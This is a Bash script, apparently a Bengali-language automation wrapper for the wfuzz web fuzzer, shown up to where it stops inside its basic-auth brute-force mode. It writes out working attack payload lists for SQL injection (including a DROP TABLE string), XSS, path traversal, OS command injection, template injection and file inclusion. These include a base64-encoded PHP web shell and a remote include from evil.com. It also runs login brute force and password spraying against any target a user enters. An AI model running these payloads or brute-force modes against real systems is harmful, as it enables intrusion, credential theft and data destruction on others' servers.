#!/bin/bash

# ================================================================
#   WFUZZ - Full Automation Tool
#   Author: SAIMUM
# ================================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
WHITE='\033[1;37m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

RESULTS_DIR="$HOME/wfuzz_results"
HISTORY_FILE="$HOME/.wfuzz_saimum_history.log"
mkdir -p "$RESULTS_DIR"

# ================================================================
# BANNER
# ================================================================
show_banner() {
    clear
    echo -e "${MAGENTA}${BOLD}"
    echo ' ██╗    ██╗███████╗██╗   ██╗███████╗███████╗'
    echo ' ██║    ██║██╔════╝██║   ██║╚══███╔╝╚══███╔╝'
    echo ' ██║ █╗ ██║█████╗  ██║   ██║  ███╔╝   ███╔╝ '
    echo ' ██║███╗██║██╔══╝  ██║   ██║ ███╔╝   ███╔╝  '
    echo ' ╚███╔███╔╝██║     ╚██████╔╝███████╗███████╗'
    echo '  ╚══╝╚══╝ ╚═╝      ╚═════╝ ╚══════╝╚══════╝'
    echo -e "${NC}"
    echo -e "${YELLOW}${BOLD}    ╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}${BOLD}    ║                    S A I M U M                        ║${NC}"
    echo -e "${YELLOW}${BOLD}    ╚═══════════════════════════════════════════════════════╝${NC}"
    echo -e "${DIM}${WHITE}         Wfuzz Full Automation Tool | Web Fuzzer${NC}"
    echo ""
    echo -e "  ${RED}${BOLD}⚠  Ethics Warning:${NC} ${WHITE}শুধুমাত্র নিজের বা অনুমতি আছে এমন target এ ব্যবহার করুন।${NC}"
    echo ""
}

# ================================================================
# CHECK DEPENDENCIES
# ================================================================
check_deps() {
    echo -e "${CYAN}[*] Dependencies চেক করা হচ্ছে...${NC}"
    local missing=()

    if command -v wfuzz &>/dev/null; then
        echo -e "  ${GREEN}[✓] wfuzz${NC}"
    else
        missing+=("wfuzz")
        echo -e "  ${RED}[✗] wfuzz — পাওয়া যায়নি${NC}"
    fi

    for tool in curl whois dig python3; do
        command -v "$tool" &>/dev/null && \
            echo -e "  ${GREEN}[✓] $tool${NC}" || \
            echo -e "  ${YELLOW}[!] $tool — নেই${NC}"
    done

    echo ""
    echo -e "${CYAN}[*] Optional tools:${NC}"
    for opt in sqlmap nikto nuclei gobuster ffuf; do
        command -v "$opt" &>/dev/null && \
            echo -e "  ${GREEN}[✓] $opt${NC}" || \
            echo -e "  ${YELLOW}[!] $opt — নেই${NC}"
    done

    echo ""
    echo -e "${CYAN}[*] Wordlists:${NC}"
    DEFAULT_WORDLIST=""
    local wls=(
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
        "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
        "/usr/share/seclists/Discovery/Web-Content/common.txt"
        "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt"
        "/usr/share/wordlists/rockyou.txt"
    )
    for wl in "${wls[@]}"; do
        if [ -f "$wl" ]; then
            [ -z "$DEFAULT_WORDLIST" ] && DEFAULT_WORDLIST="$wl"
            echo -e "  ${GREEN}[✓] $wl${NC}"
        fi
    done
    [ -z "$DEFAULT_WORDLIST" ] && echo -e "  ${YELLOW}[!] Default wordlist পাওয়া যায়নি।${NC}"

    if [ ${#missing[@]} -ne 0 ]; then
        echo ""
        echo -e "${RED}[!] Missing: ${missing[*]}${NC}"
        echo -e "${YELLOW}Install: pip3 install wfuzz  অথবা  sudo apt install wfuzz${NC}"
        exit 1
    fi

    echo ""
    local wver; wver=$(wfuzz --version 2>&1 | head -1)
    echo -e "${CYAN}[*] Wfuzz: ${GREEN}$wver${NC}"
    echo ""
}

# ================================================================
# GET TARGET
# ================================================================
get_target() {
    TARGET=""

    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║         TARGET SELECT                ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""
    read -p "$(echo -e ${WHITE}"Target URL দিন (FUZZ placeholder সহ বা ছাড়া):${NC}
${DIM}e.g. http://target.com/FUZZ  অথবা  http://target.com${NC}
URL: ")" t

    [[ ! "$t" =~ ^https?:// ]] && t="http://$t"
    TARGET="${t%/}"
    echo -e "  ${GREEN}[✓] Target: $TARGET${NC}"
    echo ""
}

# ================================================================
# PRE-SCAN RECON
# ================================================================
pre_scan_recon() {
    local url=$1
    local domain; domain=$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)

    echo ""
    echo -e "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${MAGENTA}${BOLD}   PRE-SCAN RECON  ›  $domain${NC}"
    echo -e "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    echo -e "${BLUE}${BOLD}┌─── WHOIS ──────────────────────────────────────────┐${NC}"
    whois "$domain" 2>/dev/null | grep -E "Registrar:|Country:|Organization:" | head -5 | \
        while IFS= read -r l; do echo -e "  ${WHITE}$l${NC}"; done
    echo -e "${BLUE}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""

    echo -e "${CYAN}${BOLD}┌─── HTTP HEADERS ────────────────────────────────────┐${NC}"
    local headers; headers=$(curl -s -I --max-time 8 "$url" 2>/dev/null | head -20)
    if [ -n "$headers" ]; then
        local code server powered
        code=$(echo "$headers"   | head -1)
        server=$(echo "$headers" | grep -i "^Server:"       | head -1)
        powered=$(echo "$headers"| grep -i "^X-Powered-By:" | head -1)
        echo -e "  ${WHITE}Status : ${GREEN}$code${NC}"
        [ -n "$server"  ] && echo -e "  ${WHITE}Server : ${YELLOW}$server${NC}"
        [ -n "$powered" ] && echo -e "  ${WHITE}Tech   : ${YELLOW}$powered${NC}"
        echo ""
        local waf=false
        for wh in "cf-ray" "X-Sucuri-ID" "X-WAF" "X-Firewall"; do
            echo "$headers" | grep -qi "^$wh:" && \
                echo -e "  ${RED}[!] WAF: $wh detected${NC}" && waf=true
        done
        $waf || echo -e "  ${GREEN}[✓] স্পষ্ট WAF নেই${NC}"
    fi
    echo -e "${CYAN}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# SCAN MENU
# ================================================================
show_menu() {
    echo -e "${YELLOW}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}${BOLD}║                    WFUZZ SCAN OPTIONS                               ║${NC}"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ DIRECTORY / PATH FUZZING ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}1${NC}  Directory Fuzzing          — hidden directories খোঁজো"
    echo -e "${YELLOW}║${NC} ${GREEN}2${NC}  File Extension Fuzzing     — hidden files খোঁজো"
    echo -e "${YELLOW}║${NC} ${GREEN}3${NC}  Recursive Directory Fuzz   — subdirectories ও"
    echo -e "${YELLOW}║${NC} ${GREEN}4${NC}  Backup File Fuzzing        — .bak, .old, .tmp files"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ PARAMETER FUZZING ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}5${NC}  GET Parameter Fuzzing      — URL parameter discover"
    echo -e "${YELLOW}║${NC} ${GREEN}6${NC}  POST Parameter Fuzzing     — POST body parameter"
    echo -e "${YELLOW}║${NC} ${GREEN}7${NC}  Parameter Value Fuzzing    — known param এর value test"
    echo -e "${YELLOW}║${NC} ${GREEN}8${NC}  Hidden Parameter Hunt      — invisible params খোঁজো"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ INJECTION FUZZING ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}9${NC}  SQL Injection Fuzzing      — SQLi payloads test"
    echo -e "${YELLOW}║${NC} ${GREEN}10${NC} XSS Fuzzing                — XSS payloads test"
    echo -e "${YELLOW}║${NC} ${GREEN}11${NC} Path Traversal Fuzzing     — directory traversal"
    echo -e "${YELLOW}║${NC} ${GREEN}12${NC} Command Injection Fuzzing  — OS command injection"
    echo -e "${YELLOW}║${NC} ${GREEN}13${NC} SSTI Fuzzing               — template injection"
    echo -e "${YELLOW}║${NC} ${GREEN}14${NC} LFI/RFI Fuzzing            — file inclusion"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ AUTH / SESSION FUZZING ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}15${NC} Login Brute Force          — username+password fuzz"
    echo -e "${YELLOW}║${NC} ${GREEN}16${NC} HTTP Basic Auth Fuzz       — basic auth brute force"
    echo -e "${YELLOW}║${NC} ${GREEN}17${NC} Cookie Value Fuzzing       — session token fuzz"
    echo -e "${YELLOW}║${NC} ${GREEN}18${NC} JWT Token Fuzzing          — JWT manipulation"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ HEADER FUZZING ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}19${NC} HTTP Header Fuzzing        — custom header values"
    echo -e "${YELLOW}║${NC} ${GREEN}20${NC} User-Agent Fuzzing         — UA-based bypass"
    echo -e "${YELLOW}║${NC} ${GREEN}21${NC} Host Header Fuzzing        — virtual host discovery"
    echo -e "${YELLOW}║${NC} ${GREEN}22${NC} Referer Header Fuzzing     — referer-based access"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ ADVANCED ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}23${NC} Multi-Payload (2 FUZZ)     — দুটো FUZZ একসাথে"
    echo -e "${YELLOW}║${NC} ${GREEN}24${NC} Filter by Response Size    — size দিয়ে filter"
    echo -e "${YELLOW}║${NC} ${GREEN}25${NC} Filter by Words/Lines      — word/line count filter"
    echo -e "${YELLOW}║${NC} ${GREEN}26${NC} Proxy Scan (Burp)          — Burp proxy দিয়ে"
    echo -e "${YELLOW}║${NC} ${GREEN}27${NC} Rate-limited Scan          — delay দিয়ে slow scan"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ COMBO ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}28${NC} Smart Web Fuzz             — dir+param+injection combo"
    echo -e "${YELLOW}║${NC} ${GREEN}29${NC} All-in-One Mega Fuzz       — সব mode একসাথে"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC}  ${RED}0)${NC} Exit                                                               ${YELLOW}║${NC}"
    echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ================================================================
# EXTRA OPTIONS
# ================================================================
get_extra_options() {
    THREADS_OPT="-t 20"; DELAY_OPT=""; PROXY_OPT=""
    HIDE_OPT="--hc 404,400,500"; FOLLOW_OPT=""
    COOKIE_OPT=""; HEADER_OPT=""; TIMEOUT_OPT=""

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║         EXTRA OPTIONS                ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    read -p "$(echo -e ${WHITE}"Threads (Enter=20): "${NC})" th
    [ -n "$th" ] && THREADS_OPT="-t $th"

    read -p "$(echo -e ${WHITE}"Hide status codes (Enter=404,400,500): "${NC})" hc
    [ -n "$hc" ] && HIDE_OPT="--hc $hc"

    read -p "$(echo -e ${WHITE}"Request delay ms (Enter=0): "${NC})" dl
    [ -n "$dl" ] && DELAY_OPT="-s $dl"

    read -p "$(echo -e ${WHITE}"Proxy (Enter=skip): "${NC})" px
    [ -n "$px" ] && PROXY_OPT="-p $px"

    read -p "$(echo -e ${WHITE}"Cookie (Enter=skip): "${NC})" ck
    [ -n "$ck" ] && COOKIE_OPT="-b '$ck'"

    read -p "$(echo -e ${WHITE}"Custom header (Enter=skip): "${NC})" hdr
    [ -n "$hdr" ] && HEADER_OPT="-H '$hdr'"

    read -p "$(echo -e ${WHITE}"Follow redirects? (y/n, Enter=n): "${NC})" fr
    [[ "$fr" =~ ^[Yy]$ ]] && FOLLOW_OPT="-L"

    echo ""
}

# ================================================================
# GET WORDLIST
# ================================================================
get_wordlist() {
    local prompt="${1:-Wordlist}"
    WORDLIST=""

    echo -e "${CYAN}$prompt:${NC}"
    echo -e "  ${GREEN}1)${NC} Default (dirbuster medium)"
    echo -e "  ${GREEN}2)${NC} Small list (fast)"
    echo -e "  ${GREEN}3)${NC} Custom path"
    read -p "$(echo -e ${YELLOW}"[1-3]: "${NC})" wch

    case $wch in
        1) WORDLIST="${DEFAULT_WORDLIST}" ;;
        2) WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
           [ ! -f "$WORDLIST" ] && WORDLIST="${DEFAULT_WORDLIST}" ;;
        3) read -p "$(echo -e ${WHITE}"Path: "${NC})" WORDLIST ;;
    esac

    if [ ! -f "$WORDLIST" ]; then
        echo -e "${RED}[!] Wordlist পাওয়া যায়নি।${NC}"
        read -p "$(echo -e ${WHITE}"Manual path: "${NC})" WORDLIST
        [ ! -f "$WORDLIST" ] && return 1
    fi
    echo -e "  ${GREEN}[✓] Wordlist: $WORDLIST${NC}"
    echo ""
}

# ================================================================
# RUN WFUZZ CORE
# ================================================================
run_wfuzz() {
    local label=$1 wfuzz_args=$2

    SCAN_LABEL="$label"
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local safe; safe=$(echo "$TARGET" | sed 's|https\?://||' | sed 's/[^a-zA-Z0-9._-]/_/g' | head -c 50)
    OUTPUT_FILE="$RESULTS_DIR/${label// /_}_${safe}_${ts}.txt"

    local cmd="wfuzz $THREADS_OPT $DELAY_OPT $PROXY_OPT $HIDE_OPT $FOLLOW_OPT $COOKIE_OPT $HEADER_OPT -o raw $wfuzz_args"

    echo ""
    echo -e "${CYAN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${WHITE}Scan Type : ${YELLOW}${BOLD}$label${NC}"
    echo -e "  ${WHITE}Target    : ${GREEN}${BOLD}$TARGET${NC}"
    echo -e "  ${WHITE}Output    : ${CYAN}$OUTPUT_FILE${NC}"
    echo -e "  ${WHITE}Command   : ${DIM}$cmd${NC}"
    echo -e "${CYAN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    read -p "$(echo -e ${YELLOW}"[?] Scan শুরু করবেন? (y/n): "${NC})" go
    [[ ! "$go" =~ ^[Yy]$ ]] && return

    echo ""
    echo -e "${GREEN}${BOLD}[*] Wfuzz চালু হচ্ছে...${NC}"
    echo ""

    eval "$cmd" 2>&1 | tee "$OUTPUT_FILE"

    echo ""
    echo -e "${GREEN}${BOLD}[✓] Scan সম্পন্ন!${NC}"
    echo ""

    bangla_analysis "$OUTPUT_FILE"
    suggest_next_tool "$OUTPUT_FILE"
    save_results "$OUTPUT_FILE"
}

# ================================================================
# MODE 1 — DIRECTORY FUZZING
# ================================================================
mode_dir_fuzz() {
    get_wordlist "Directory wordlist" || return
    local url="$TARGET"
    [[ "$url" != *"FUZZ"* ]] && url="${url}/FUZZ"
    run_wfuzz "Directory Fuzzing" "-w '$WORDLIST' '$url'"
}

# ================================================================
# MODE 2 — FILE EXTENSION FUZZING
# ================================================================
mode_ext_fuzz() {
    get_wordlist "Filename wordlist" || return

    echo -e "${CYAN}Extensions (e.g. php,html,js,txt,bak):${NC}"
    read -p "$(echo -e ${WHITE}"Extensions: "${NC})" exts
    [ -z "$exts" ] && exts="php,html,js,txt,xml,json,bak,old"

    # Create extension payload
    local ext_file="/tmp/wfuzz_ext_$$.txt"
    echo "$exts" | tr ',' '\n' > "$ext_file"

    local url="$TARGET"
    [[ "$url" != *"FUZZ"* ]] && url="${url}/FUZZ.FUZ2Z"

    run_wfuzz "Extension Fuzzing" "-w '$WORDLIST' -w '$ext_file' '${url}'"
    rm -f "$ext_file"
}

# ================================================================
# MODE 3 — RECURSIVE FUZZING
# ================================================================
mode_recursive_fuzz() {
    get_wordlist "Recursive wordlist" || return
    local url="$TARGET"
    [[ "$url" != *"FUZZ"* ]] && url="${url}/FUZZ"

    echo -e "${YELLOW}[!] Recursive scan অনেক সময় নিতে পারে।${NC}"
    read -p "$(echo -e ${WHITE}"Recursion depth (Enter=2): "${NC})" depth
    [ -z "$depth" ] && depth=2

    run_wfuzz "Recursive Dir Fuzz" "-w '$WORDLIST' -R $depth '$url'"
}

# ================================================================
# MODE 4 — BACKUP FILE FUZZING
# ================================================================
mode_backup_fuzz() {
    local bak_file="/tmp/wfuzz_bak_$$.txt"
    cat > "$bak_file" << 'EOF'
index
config
backup
database
db
admin
login
.env
.htaccess
web
site
app
application
data
settings
configuration
users
passwords
credentials
EOF

    local ext_file="/tmp/wfuzz_bakext_$$.txt"
    cat > "$ext_file" << 'EOF'
.bak
.old
.tmp
.orig
.copy
.back
.save
~
.swp
.sql
.tar.gz
.zip
.rar
EOF

    local url="$TARGET"
    [[ "$url" != *"FUZZ"* ]] && url="${url}/FUZZ"

    run_wfuzz "Backup File Fuzz" "-w '$bak_file' -w '$ext_file' '${TARGET}/FUZZFUZ2Z'"
    rm -f "$bak_file" "$ext_file"
}

# ================================================================
# MODE 5 — GET PARAMETER FUZZING
# ================================================================
mode_get_param_fuzz() {
    local param_file="/tmp/wfuzz_params_$$.txt"
    if [ -f "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" ]; then
        cp "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" "$param_file"
    else
        cat > "$param_file" << 'EOF'
id
user
username
name
page
search
query
q
keyword
file
path
url
redirect
next
return
token
key
api
action
type
category
sort
order
limit
offset
debug
test
admin
pass
password
email
phone
lang
language
format
output
callback
data
json
xml
EOF
    fi

    local url="$TARGET"
    [[ "$url" != *"FUZZ"* ]] && url="${url}?FUZZ=1"

    run_wfuzz "GET Parameter Fuzz" "-w '$param_file' '$url'"
    rm -f "$param_file"
}

# ================================================================
# MODE 6 — POST PARAMETER FUZZING
# ================================================================
mode_post_param_fuzz() {
    local param_file="/tmp/wfuzz_post_$$.txt"
    cat > "$param_file" << 'EOF'
username
password
user
pass
email
login
name
id
token
remember
action
submit
data
payload
content
message
text
value
param
field
EOF

    read -p "$(echo -e ${WHITE}"POST endpoint URL দিন: "${NC})" post_url
    [ -z "$post_url" ] && post_url="$TARGET"
    [[ ! "$post_url" =~ ^https?:// ]] && post_url="http://$post_url"

    run_wfuzz "POST Parameter Fuzz" "-w '$param_file' -d 'FUZZ=test' '$post_url'"
    rm -f "$param_file"
}

# ================================================================
# MODE 7 — PARAMETER VALUE FUZZING
# ================================================================
mode_value_fuzz() {
    read -p "$(echo -e ${WHITE}"Parameter name দিন (e.g. id): "${NC})" param_name
    [ -z "$param_name" ] && param_name="id"

    get_wordlist "Value wordlist (e.g. numbers, strings)" || return

    local url="$TARGET"
    [[ "$url" != *"FUZZ"* ]] && url="${url}?${param_name}=FUZZ"

    run_wfuzz "Value Fuzzing ($param_name)" "-w '$WORDLIST' '$url'"
}

# ================================================================
# MODE 8 — HIDDEN PARAMETER HUNT
# ================================================================
mode_hidden_param() {
    local param_file="/tmp/wfuzz_hidden_$$.txt"
    if [ -f "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" ]; then
        cp "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" "$param_file"
    else
        cat > "$param_file" << 'EOF'
debug
test
admin
secret
key
token
internal
hidden
private
dev
staging
backdoor
bypass
override
config
setup
install
backup
restore
export
import
upload
delete
drop
exec
eval
system
shell
cmd
command
EOF
    fi

    local url="$TARGET"
    [[ "$url" != *"FUZZ"* ]] && url="${url}?FUZZ=1"

    # Hide only 404, show all others including 200,302,403
    HIDE_OPT="--hc 404"
    run_wfuzz "Hidden Parameter Hunt" "-w '$param_file' '$url'"
    HIDE_OPT="--hc 404,400,500"
    rm -f "$param_file"
}

# ================================================================
# MODE 9 — SQL INJECTION FUZZING
# ================================================================
mode_sqli_fuzz() {
    local sqli_file="/tmp/wfuzz_sqli_$$.txt"
    cat > "$sqli_file" << 'EOF'
'
''
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR ('1'='1
' OR 'x'='x
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
1 AND 1=1
1 AND 1=2
admin'--
' OR 1=1 LIMIT 1--
1; DROP TABLE users--
EOF

    read -p "$(echo -e ${WHITE}"URL দিন (FUZZ placeholder সহ, e.g. http://target.com/page.php?id=FUZZ): "${NC})" sqli_url
    [ -z "$sqli_url" ] && sqli_url="${TARGET}?id=FUZZ"

    HIDE_OPT="--hc 404"
    run_wfuzz "SQL Injection Fuzz" "-w '$sqli_file' '$sqli_url'"
    HIDE_OPT="--hc 404,400,500"
    rm -f "$sqli_file"
}

# ================================================================
# MODE 10 — XSS FUZZING
# ================================================================
mode_xss_fuzz() {
    local xss_file="/tmp/wfuzz_xss_$$.txt"
    cat > "$xss_file" << 'EOF'
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input onfocus=alert(1) autofocus>
javascript:alert(1)
<details open ontoggle=alert(1)>
<img/src=x onerror=alert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
&lt;script&gt;alert(1)&lt;/script&gt;
EOF

    read -p "$(echo -e ${WHITE}"URL দিন (FUZZ placeholder সহ): "${NC})" xss_url
    [ -z "$xss_url" ] && xss_url="${TARGET}?q=FUZZ"

    HIDE_OPT="--hc 404,500"
    run_wfuzz "XSS Fuzzing" "-w '$xss_file' '$xss_url'"
    HIDE_OPT="--hc 404,400,500"
    rm -f "$xss_file"
}

# ================================================================
# MODE 11 — PATH TRAVERSAL FUZZING
# ================================================================
mode_traversal_fuzz() {
    local trav_file="/tmp/wfuzz_trav_$$.txt"
    cat > "$trav_file" << 'EOF'
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
....//....//....//etc/passwd
..././..././..././etc/passwd
/etc/passwd
%2Fetc%2Fpasswd
..%c0%af..%c0%af..%c0%afetc/passwd
..%2F..%2F..%2Fetc%2Fshadow
../../../windows/system32/drivers/etc/hosts
../../../../windows/win.ini
../../../proc/self/environ
../../../var/log/apache2/access.log
EOF

    read -p "$(echo -e ${WHITE}"URL দিন (FUZZ placeholder সহ, e.g. ?file=FUZZ): "${NC})" trav_url
    [ -z "$trav_url" ] && trav_url="${TARGET}?file=FUZZ"

    HIDE_OPT="--hc 404,500"
    run_wfuzz "Path Traversal Fuzz" "-w '$trav_file' '$trav_url'"
    HIDE_OPT="--hc 404,400,500"
    rm -f "$trav_file"
}

# ================================================================
# MODE 12 — COMMAND INJECTION FUZZING
# ================================================================
mode_cmdi_fuzz() {
    local cmdi_file="/tmp/wfuzz_cmdi_$$.txt"
    cat > "$cmdi_file" << 'EOF'
; id
& id
| id
`id`
$(id)
; ls -la
& ls -la
| ls -la
; cat /etc/passwd
| cat /etc/passwd
; whoami
& whoami
; sleep 5
| sleep 5
& sleep 5
$(sleep 5)
%0a id
%0d%0a id
; ping -c 1 127.0.0.1
| nslookup localhost
EOF

    read -p "$(echo -e ${WHITE}"URL দিন (FUZZ placeholder সহ): "${NC})" cmdi_url
    [ -z "$cmdi_url" ] && cmdi_url="${TARGET}?cmd=FUZZ"

    HIDE_OPT="--hc 404,500"
    run_wfuzz "Command Injection Fuzz" "-w '$cmdi_file' '$cmdi_url'"
    HIDE_OPT="--hc 404,400,500"
    rm -f "$cmdi_file"
}

# ================================================================
# MODE 13 — SSTI FUZZING
# ================================================================
mode_ssti_fuzz() {
    local ssti_file="/tmp/wfuzz_ssti_$$.txt"
    cat > "$ssti_file" << 'EOF'
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}
${{7*7}}
{{config}}
{{self}}
{{request}}
{{''.__class__}}
{{request.application.__globals__}}
${T(java.lang.Runtime).getRuntime().exec('id')}
EOF

    read -p "$(echo -e ${WHITE}"URL দিন (FUZZ placeholder সহ): "${NC})" ssti_url
    [ -z "$ssti_url" ] && ssti_url="${TARGET}?name=FUZZ"

    HIDE_OPT="--hc 404,500"
    run_wfuzz "SSTI Fuzzing" "-w '$ssti_file' '$ssti_url'"
    HIDE_OPT="--hc 404,400,500"
    rm -f "$ssti_file"
}

# ================================================================
# MODE 14 — LFI/RFI FUZZING
# ================================================================
mode_lfi_fuzz() {
    local lfi_file="/tmp/wfuzz_lfi_$$.txt"
    cat > "$lfi_file" << 'EOF'
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/version
/var/log/apache2/access.log
/var/log/nginx/access.log
../../../../etc/passwd
../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id
http://evil.com/shell.txt
EOF

    read -p "$(echo -e ${WHITE}"URL দিন (FUZZ placeholder সহ, e.g. ?page=FUZZ): "${NC})" lfi_url
    [ -z "$lfi_url" ] && lfi_url="${TARGET}?page=FUZZ"

    HIDE_OPT="--hc 404,500"
    run_wfuzz "LFI/RFI Fuzzing" "-w '$lfi_file' '$lfi_url'"
    HIDE_OPT="--hc 404,400,500"
    rm -f "$lfi_file"
}

# ================================================================
# MODE 15 — LOGIN BRUTE FORCE
# ================================================================
mode_login_brute() {
    read -p "$(echo -e ${WHITE}"Login POST URL দিন: "${NC})" login_url
    [ -z "$login_url" ] && login_url="$TARGET"
    [[ ! "$login_url" =~ ^https?:// ]] && login_url="http://$login_url"

    read -p "$(echo -e ${WHITE}"Username field name (e.g. username): "${NC})" user_field
    read -p "$(echo -e ${WHITE}"Password field name (e.g. password): "${NC})" pass_field
    read -p "$(echo -e ${WHITE}"Failed login text (e.g. 'Invalid'): "${NC})" fail_text

    echo -e "${CYAN}Mode:${NC}"
    echo -e "  ${GREEN}1)${NC} Password spray (1 user, many passwords)"
    echo -e "  ${GREEN}2)${NC} User enum (many users, 1 password)"
    echo -e "  ${GREEN}3)${NC} Full brute (users + passwords)"
    read -p "$(echo -e ${YELLOW}"[1-3]: "${NC})" brute_mode

    local user_wl pass_wl
    case $brute_mode in
        1)
            read -p "$(echo -e ${WHITE}"Username: "${NC})" single_user
            get_wordlist "Password wordlist" || return
            pass_wl="$WORDLIST"
            local tmp_user="/tmp/wfuzz_user_$$.txt"
            echo "$single_user" > "$tmp_user"
            user_wl="$tmp_user"
            ;;
        2)
            get_wordlist "Username wordlist" || return
            user_wl="$WORDLIST"
            read -p "$(echo -e ${WHITE}"Password: "${NC})" single_pass
            local tmp_pass="/tmp/wfuzz_pass_$$.txt"
            echo "$single_pass" > "$tmp_pass"
            pass_wl="$tmp_pass"
            ;;
        3)
            get_wordlist "Username wordlist" || return
            user_wl="$WORDLIST"
            get_wordlist "Password wordlist" || return
            pass_wl="$WORDLIST"
            ;;
    esac

    local hide_str=""
    [ -n "$fail_text" ] && hide_str="--hs '$fail_text'"

    HIDE_OPT="--hc 404,500"
    run_wfuzz "Login Brute Force" "-w '$user_wl' -w '$pass_wl' $hide_str -d '${user_field}=FUZZ&${pass_field}=FUZ2Z' '$login_url'"
    HIDE_OPT="--hc 404,400,500"

    [ -f "/tmp/wfuzz_user_$$.txt" ] && rm -f "/tmp/wfuzz_user_$$.txt"
    [ -f "/tmp/wfuzz_pass_$$.txt" ] && rm -f "/tmp/wfuzz_pass_$$.txt"
}

# ================================================================
# MODE 16 — HTTP BASIC AUTH
# ================================================================
mode_basic_auth() {
    read -p "$(echo -e ${WHITE}"Protected URL দিন: "${NC})" auth_url
    [ -z "$auth_url" ] && auth_url="$TARGET"

    echo -e "${CYAN}Mode:${NC}"
    echo -e "  ${GREEN}1)${NC} Username fuzz (password fixed)"
    echo -e "  ${GREEN}2)${NC} Password fuzz (username fixed)"
    echo -e "  ${GREEN}3)${NC} Both fuzz"
    read -p "$(echo -e ${YELLOW}"[1-3]: "${NC})" auth_mode

    case $auth_mode in
        1)
            get_wordlist "Username wordlist" || return
            read -p "$(echo -e ${WHITE}"Fixed password: "${NC})" fixed_pass
            run_wfuzz "Basic Auth User Fuzz" "-w '$WORDLIST' --basic 'FUZZ:$fixed_pass' '$auth_url'"
            ;;
        2)
            read -p "$(echo -e ${WHITE}"Fixed username: "${NC})" fixed_user
            get_wordlist "Password wordlist" || return
